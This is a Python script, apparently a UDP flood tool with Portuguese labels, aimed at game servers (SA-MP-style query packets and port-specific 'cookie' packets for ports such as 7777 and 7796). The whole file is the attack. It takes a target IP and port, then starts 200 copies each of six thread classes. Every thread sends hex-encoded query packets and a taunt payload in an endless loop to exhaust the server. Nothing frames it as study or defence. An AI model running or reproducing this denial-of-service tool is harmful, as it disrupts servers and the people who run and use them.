import socket
import struct
import codecs,sys
import threading
import random
import time
import os

ip = sys.argv[1]
port = sys.argv[2]
orgip =ip

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#u
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("021efd40","hex_codec"),#cookie port 1111
                       codecs.decode("35342c38302c3232","hex_codec"),#cookie port 7771 
                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                       ]

print("Ataque iniciado no ip: %s e Porta: %s"%(orgip,port))

class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,3)]
                
                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                     
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))    


class MyThread1(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,3)]
                
                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                     
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))
                    
class MyThread2(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,3)]
                
                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                     
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))


class MyThread3(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,3)]
                
                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                     
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))

class MyThread4(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,3)]
                
                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                     
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))

class MyThread5(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                 
                payload = b'544845204a41592041545441434b494e47202d3e20554450202d3e20544f20534552564552'
                
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(msg, (ip, int(port)))
                
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                sock.sendto(payload, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(Pacotes[9], (ip, int(port)))
                elif(int(port) == 7778):
                    sock.sendto(Pacotes[8], (ip, int(port)))
                elif(int(port) == 2023):
                    sock.sendto(Pacotes[3], (ip, int(port)))
                elif(int(port) == 7776):
                    sock.sendto(Pacotes[10], (ip, int(port)))

		
if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()
            mythread1 = MyThread1()
            mythread2 = MyThread2()
            mythread3 = MyThread3()
            mythread4 = MyThread4()
            mythread5 = MyThread5()
            mythread.start()
            mythread1.start()
            mythread2.start()
            mythread3.start()
            mythread4.start()            
            mythread5.start()
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
         print("Close")
         pass
